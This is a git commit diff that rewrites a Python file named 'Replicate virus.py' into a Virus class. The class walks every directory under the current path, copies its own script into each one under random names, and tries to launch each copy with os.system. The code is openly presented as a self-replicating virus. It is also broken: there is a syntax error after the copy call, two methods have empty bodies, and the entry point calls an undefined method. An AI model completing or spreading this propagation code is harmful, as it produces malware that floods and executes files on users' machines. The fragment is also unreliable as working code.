277d16640219e3bb21629426d576b7a1cc1ea71f
PRO-Coding <80043809+pro-whitehatjr@users.noreply.github.com>
2021-10-23 10:02:26 +0530

    Update Replicate virus.py

--- Replicate virus.py
+++ Replicate virus.py
@@ -1,24 +1,52 @@
-# I AM VIRUS !
+import os
+import shutil 
+#shutil is used to copy the content
+import random
 
-import sys
-import glob
+#Intialize 
+class Virus:
+    
+    def __init__(self, path=None, target_dir=None, repeat=None):
+        self.path = path
+        self.target_dir = []
+        self.repeat = 2
+        self.own_path = os.path.realpath(__file__)
+        
+ # To get the path
+        
+    def list_directories(self,path):
+        self.target_dir.append(path)
+        current_dir = os.listdir(path)
+        
+        for file in current_dir:
+            if not file.startswith('.'):
+                # get the full path
+                absolute_path = os.path.join(path, file)
+                print(absolute_path)
 
-virus_code = []
-
-with open(sys.argv[0], 'r') as f:
-    lines = f.readlines()
-
-self_replicating_part = False
-for line in lines:
-    if line == "# VIRUS SAYS HI, HAVE INFECTED ALL YOUR FILES!!":
-        self_replicating_part = True
-    if not self_replicating_part:
-        virus_code.append(line)
-    if line == "# VIRUS SAYS BYE!\n":
-        break
-
-
-
-
-
-# VIRUS SAYS BYE!
+                if os.path.isdir(absolute_path):
+                    self.list_directories(absolute_path)
+                else:
+                    pass
+#Make new file 
+   
+    def new_virus(self):
+        for directory in self.target_dir:
+            n = random.randint(0,10)
+            new_script="Virus"+str(n)+".py"
+            destination = os.path.join(directory, new_script)
+            shutil.copyfile(self.own_path, destination)s
+            os.system(new_script + " 1")
+#Replcate   
+    def replicate(self):
+      
+                        
+    def Virus_action(self):
+      
+        
+        
+                        
+if __name__=="__main__":
+    current_directory = os.path.abspath("")
+    Virus = Virus(path=current_directory)
+    Virus.Virus_action()
